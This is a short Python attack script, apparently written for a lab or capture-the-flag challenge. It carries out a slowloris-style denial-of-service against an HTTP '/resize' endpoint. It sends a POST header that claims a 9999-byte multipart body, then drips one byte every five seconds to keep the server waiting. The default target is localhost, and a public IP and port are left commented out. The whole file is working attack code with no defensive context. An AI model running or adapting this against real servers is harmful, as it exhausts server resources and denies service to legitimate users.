import socket
import time

TARGET_IP = "127.0.0.1" 
TARGET_PORT = 5022
#TARGET_IP = '154.57.164.75'
#TARGET_PORT = 32159


def run_slowloris():
    print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}...")
    
    # create a raw TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    
    # 2. Send fake http header
    # Tell server this is POST request and content's length is 9999 bytes
    headers = (
        "POST /resize HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n"
        "Content-Length: 9999\r\n"
        "\r\n" # Signal \r\n\r\n informs termination of Header, prepare to send body
    )
    s.send(headers.encode('utf-8'))
    print("[*] Header sent! Server is waiting for full Body...")
    
    # 3. Start slowloris process
    try:
        # Repeat 10 times, 5s each => Total server hangs for 50 sec
        for i in range(10):
            print(f"[-] Dropping byte number {i+1}...")
            s.send(b"A") # Send only one letter 'A'
            time.sleep(5) # Sleep 5s
            
        print("[*] Finish. Server should be timeout!")
    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    run_slowloris()